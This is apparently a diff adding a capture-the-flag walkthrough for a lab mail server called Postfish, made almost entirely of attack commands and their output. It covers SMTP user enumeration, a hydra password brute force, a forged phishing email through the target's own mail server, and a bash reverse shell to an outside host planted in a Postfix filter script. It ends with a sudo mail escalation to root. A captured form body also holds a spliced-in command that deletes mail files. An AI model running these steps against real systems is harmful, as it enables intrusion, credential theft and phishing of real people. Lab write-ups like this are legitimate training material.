@@ -1,0 +1,259 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.161.137 > Postfish.txt 
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-26T10:26:37
+| Not valid after:  2031-01-24T10:26:37
+| MD5:     5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
+| SHA-1:   63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
+|_SHA-256: ea6b 3963 fc63 b6ca 988b a6fe 75ec 6034 58e2 0d97 19a3 9b5a 5c97 151a 9a68 7893
+80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) CAPA RESP-CODES USER TOP UIDL PIPELINING STLS AUTH-RESP-CODE
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-26T10:26:37
+| Not valid after:  2031-01-24T10:26:37
+| MD5:     5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
+| SHA-1:   63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
+|_SHA-256: ea6b 3963 fc63 b6ca 988b a6fe 75ec 6034 58e2 0d97 19a3 9b5a 5c97 151a 9a68 7893
+|_ssl-date: TLS randomness does not represent time
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ ID more capabilities have listed IDLE SASL-IR Pre-login STARTTLS OK LOGIN-REFERRALS AUTH=PLAINA0001 post-login ENABLE IMAP4rev1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-26T10:26:37
+| Not valid after:  2031-01-24T10:26:37
+| MD5:     5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
+| SHA-1:   63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
+|_SHA-256: ea6b 3963 fc63 b6ca 988b a6fe 75ec 6034 58e2 0d97 19a3 9b5a 5c97 151a 9a68 7893
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-26T10:26:37
+| Not valid after:  2031-01-24T10:26:37
+| MD5:     5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
+| SHA-1:   63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
+|_SHA-256: ea6b 3963 fc63 b6ca 988b a6fe 75ec 6034 58e2 0d97 19a3 9b5a 5c97 151a 9a68 7893
+|_imap-capabilities: LITERAL+ ID capabilities more listed IDLE have Pre-login ENABLE IMAP4rev1 LOGIN-REFERRALS OK post-login SASL-IR AUTH=PLAINA0001
+995/tcp open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: TOP CAPA UIDL RESP-CODES USER SASL(PLAIN) AUTH-RESP-CODE PIPELINING
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-26T10:26:37
+| Not valid after:  2031-01-24T10:26:37
+| MD5:     5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
+| SHA-1:   63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
+|_SHA-256: ea6b 3963 fc63 b6ca 988b a6fe 75ec 6034 58e2 0d97 19a3 9b5a 5c97 151a 9a68 7893
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+$ searchsploit Postfix -o
+Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection | linux/remote/34896.py
+
+# go port 80 website, get user names + smtp-user-enum to gather more username.
+
+Jane:Claire Madison:HR Specialist
+Mike:Mike Ross:IT Pro
+John:Brian Moore:Sales Manager
+talya:Sarah Lorem:Legal Advisor
+
+$ smtp-user-enum -t 192.168.161.137 -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt
+
+hr@postfish.off
+legal@postfish.off
+sales@postfish.off
+root@postfish.off
+brian.moore@postfish.off
+sarah.lorem@postfish.off
+claire.madison@postfish.off
+mike.ross@postfish.off
+
+$ cewl -d 5 http://postfish.off/team.html -w passwords.txt # Make password list 
+$ tr A-Z a-z < passwords.txt > pop_passwordss.txt && mv pop_passwordss.txt passwords.txt # Converting all passwords to lower case
+
+$ hydra -L names -P passwords.txt 192.168.161.137 pop3 -f
+[110][pop3] host: 192.168.161.137   login: sales   password: sales
+
+$ telnet 192.168.161.137 110
+USER sales
++OK
+PASS sales
++OK Logged in.
+list
++OK 1 messages:
+1 683
+.
+retr 1
++OK 683 octets
+Return-Path: <it@postfish.off>
+X-Original-To: sales@postfish.off
+Delivered-To: sales@postfish.off
+Received: by postfish.off (Postfix, from userid 997)
+        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
+Received: from x (localhost [127.0.0.1])
+        by postfish.off (Postfix) with SMTP id 7712145434
+        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+Subject: ERP Registration Reminder
+Message-Id: <20210331131139.7712145434@postfish.off>
+Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+From: it@postfish.off
+
+Hi Sales team,
+
+We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
+
+Regards,
+IT
+
+# Need to email phishing here, use brian.moore as website indicate he is sales
+
+$ nc -nv 192.168.161.137 25
+(UNKNOWN) [192.168.161.137] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+HELO post
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Resetreset password at this link http://192.168.45.178/
+.
+250 2.0.0 Ok: queued as 37D51458F9
+QUIT
+221 2.0.0 Bye
+
+$ rlwrap nc -nlvp 80  
+listening on [any] 80 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.161.137] 36970
+POST / HTTP/1.1
+Host: 192.168.45.178
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 207
+Content-Type: application/x-www-form-urlencoded
+
+first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
+
+
+# Get credentials for brian.moore:EternaLSunshinE
+
+$ ssh brian.moore@192.168.161.137
+brian.moore@postfish:~$ id
+uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
+
+Linux postfish 5.4.0-64-generic #72-Ubuntu SMP Fri Jan 15 10:27:54 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+NAME="Ubuntu"
+VERSION="20.04.1 LTS (Focal Fossa)"
+Sudo version 1.8.31
+
+# Linpeas.sh Interesting GROUP writable files
+/etc/postfix/disclaimer
+  
+brian.moore@postfish:/etc/postfix$ cat disclaimer
+#!/bin/bash
+# Localize these.
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
+
+####### Changed From Original Script #######
+DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses 
+...
+...
+...
+
+cat /etc/postfix/disclaimer_addresses
+it@postfish.off
+brian.moore@postfish.off
+
+# it looks like the trigger about how we get brian credential.
+Add /bin/bash -i >& /dev/tcp/192.168.45.178/21 0>&1 to /etc/postfix/disclaimer
+
+$ nc -nv 192.168.161.137 25
+# Trigger mail server to run the script again
+
+$ rlwrap nc -nlvp 21 
+listening on [any] 21 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.161.137] 56424
+bash: cannot set terminal process group (70097): Inappropriate ioctl for device
+bash: no job control in this shell
+filter@postfish:/var/spool/postfix$ id
+id
+uid=997(filter) gid=997(filter) groups=997(filter)
+
+filter@postfish:/var/spool/postfix$ sudo -l
+(ALL) NOPASSWD: /usr/bin/mail *
+# Check https://gtfobins.org/gtfobins/mail/#shell
+filter@postfish:/var/spool/postfix$ sudo mail --exec='!/bin/sh'
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+#####################################################################################
+# Remember the step to send email using target mail server port 25
+$ nc -nv 192.168.161.137 25
+(UNKNOWN) [192.168.161.137] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+HELO post
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Resetreset password at this link http://192.168.45.178/
+.
+250 2.0.0 Ok: queued as 37D51458F9
+QUIT
+221 2.0.0 Bye
+
+# Fetch User mail in port 110
+telnet 192.168.161.137 110
+USER sales
++OK
+PASS sales
++OK Logged in.
+list
++OK 1 messages:
+1 683
+.
+retr 1
+
